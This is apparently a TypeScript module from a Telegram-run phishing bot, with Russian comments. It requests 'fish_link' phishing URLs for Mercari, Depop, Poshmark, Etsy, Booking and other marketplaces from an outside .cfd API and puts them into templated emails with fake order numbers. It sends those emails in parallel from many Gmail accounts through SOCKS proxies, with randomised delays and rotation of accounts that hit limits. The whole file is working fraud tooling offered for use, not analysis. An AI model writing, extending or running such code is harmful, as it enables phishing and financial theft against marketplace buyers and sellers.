import * as nodemailer from 'nodemailer';
import { SocksClient } from 'socks';
import { prisma } from './db.js';

const LINK_API_URL = 'https://api.k7r4q9p2z1x1.cfd/api/protected';

const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

export const mailingState: Record<string, any> = {};

const platformToService: Record<string, string> = {
    MERCARI_USA: 'mercari3_usa',
    OFFERUP_USA: 'offerup3_usa',
    DEPOP_USA: 'depop3_usa',
    DEPOP_UK: 'depop3_uk',
    POSHMARK_USA: 'poshmark3_eu',
    ETSY: 'etsy_eu',
    BOOKING: 'booking_eu_parse'
};

async function generateLink(platform: string, userId: string, title: string, userToken: string): Promise<any> {
    try {
        const service = platformToService[platform] || 'depop3_usa';
        const response = await fetch(LINK_API_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ api_key: userToken, title, service, userId })
        });
        if (!response.ok) throw new Error(`API статус: ${response.status}`);
        return await response.json();
    } catch (err: any) {
        return { message: '#', fish_link: '#', search_link: '#' };
    }
}

export async function runMailing(
    config: { delayRange: { min: number; max: number }; userId: string },
    logCallback: (msg: string) => void
) {
    const { userId } = config;
    const template = await prisma.template.findFirst({ where: { telegramId: userId, isActive: true } });
    const accounts = await prisma.emailAccount.findMany({ where: { isActive: true, telegramId: userId } });
    const user = await prisma.user.findUnique({ where: { telegramId: userId } });

    if (!template || accounts.length === 0 || !user?.token) {
        logCallback("❌ Ошибка: проверьте шаблон, аккаунты или токен.");
        return;
    }

    mailingState[userId] = 'RUNNING';
    logCallback(`🚀 Запуск параллельной рассылки (по 5 потокам)...`);

    const CONCURRENCY = 5;
    for (let i = 0; i < accounts.length; i += CONCURRENCY) {
        if (mailingState[userId] === 'STOPPED') break;
        const chunk = accounts.slice(i, i + CONCURRENCY);
        await Promise.all(chunk.map(acc => processAccount(acc, template, config, logCallback, userId, user.token, user.proxy)));
    }

    logCallback("🏁 Все потоки завершены.");
    mailingState[userId] = 'STOPPED';
}

async function processAccount(
    account: any,
    template: any,
    config: any,
    logCallback: (msg: string) => void,
    userId: string,
    userToken: string,
    userProxy: string | null
) {
    let recipientsList: { email: string; name: string }[] = [];
    try {
        recipientsList = account.recipients ? JSON.parse(account.recipients) : [];
    } catch { return; }

    // Идем строго по списку получателей
    for (let i = account.currentIndex; i < recipientsList.length; i++) {
        if (mailingState[userId] === 'STOPPED') break;
        while (mailingState[userId] === 'PAUSED') {
            await delay(1000);
            if (mailingState[userId] === 'STOPPED') return;
        }

        const recipient = recipientsList[i];

        try {
            const linkData = await generateLink(template.platform, userId, recipient.name || '', userToken);
            let transporter;

            // Если есть прокси — создаем сокет СТРОГО под текущее письмо
            if (userProxy) {
                const proxyUrl = new URL(userProxy);
                const proxyHost = proxyUrl.hostname;
                const proxyPort = parseInt(proxyUrl.port, 10);
                const proxyAuth = proxyUrl.username ? { userId: proxyUrl.username, password: proxyUrl.password } : undefined;

                // 1. Открываем базовое TCP-подключение через прокси строго на порт 587
                const info = await SocksClient.createConnection({
                    proxy: {
                        host: proxyHost,
                        port: proxyPort,
                        type: 5,
                        userId: proxyAuth?.userId,
                        password: proxyAuth?.password
                    },
                    command: 'connect',
                    destination: {
                        host: 'smtp.gmail.com',
                        port: 587 // Переключаемся на порт STARTTLS
                    }
                });

                // 2. Инициализируем транспорт
                transporter = nodemailer.createTransport({
                    socket: info.socket,
                    host: 'smtp.gmail.com',
                    port: 587,
                    secure: false,       // Для 587 портаsecure должен быть false!
                    requireTLS: true,    // Это заставит nodemailer поднять TLS сразу после подключения
                    auth: { user: account.email, pass: account.password },
                    connectionTimeout: 20000, // Увеличим таймауты для надежности на Railway
                    socketTimeout: 20000
                } as any);
            } else {
                // Если прокси нет — обычная отправка напрямую
                transporter = nodemailer.createTransport({
                    host: 'smtp.gmail.com',
                    port: 465,
                    secure: true,
                    auth: { user: account.email, pass: account.password },
                    connectionTimeout: 15000,
                    socketTimeout: 15000
                });
            }

            let body = template.body
                .replace(/{{ORDER_ID}}/g, `#${Math.floor(Math.random() * 90000 + 10000)}`)
                .replace(/{{LINK}}/g, linkData.message || '#')
                .replace(/{{FISH_LINK}}/g, linkData.fish_link || '#')
                .replace(/{{SEARCH_LINK}}/g, linkData.search_link || '#')
                .replace(/{{NAME}}/g, recipient.name);

            if (mailingState[userId] === 'STOPPED') {
                break;
            }

            // Отправляем письмо
            await transporter.sendMail({
                from: template.senderName ? `${template.senderName} <${account.email}>` : account.email,
                to: recipient.email,
                subject: template.subject,
                [template.type === 'HTML' ? 'html' : 'text']: body
            });

            // Обновляем индекс в базе и пишем успешный лог
            await prisma.emailAccount.update({ where: { id: account.id }, data: { currentIndex: i + 1 } });
            await prisma.log.create({
                data: {
                    status: 'SUCCESS',
                    fromEmail: account.email,
                    toEmail: recipient.email,
                    telegramId: userId
                }
            });

            logCallback(`✅ [${account.email}] → ${recipient.email}`);

            // Важно: уничтожаем сокет и закрываем транспорт СРАЗУ после отправки,
            // чтобы при следующем шаге цикла создалось абсолютно чистое новое подключение!
            transporter.close();

            // Спим заданный интервал
            const sleep = Math.floor(Math.random() * (config.delayRange.max - config.delayRange.min + 1) + config.delayRange.min) * 1000;
            const start = Date.now();
            while (Date.now() - start < sleep) {
                if (mailingState[userId] === 'STOPPED') return;
                await delay(500);
            }

        } catch (err: any) {
            console.error(`❌ Ошибка отправки [${account.email}]:`, err.message || err);

            await prisma.log.create({
                data: {
                    status: 'ERROR',
                    fromEmail: account.email,
                    toEmail: recipient?.email || 'unknown',
                    telegramId: userId
                }
            });

            // Если это лимиты или неверный пароль — стопаем этот аккаунт полностью
            if (err.message && (err.message.includes('Authentication') || err.message.includes('limit') || err.message.includes('exceeded'))) {
                break;
            }

            // При любой другой сетевой ошибке ждем 5 сек и идем дальше
            await delay(5000);
        }
    }
}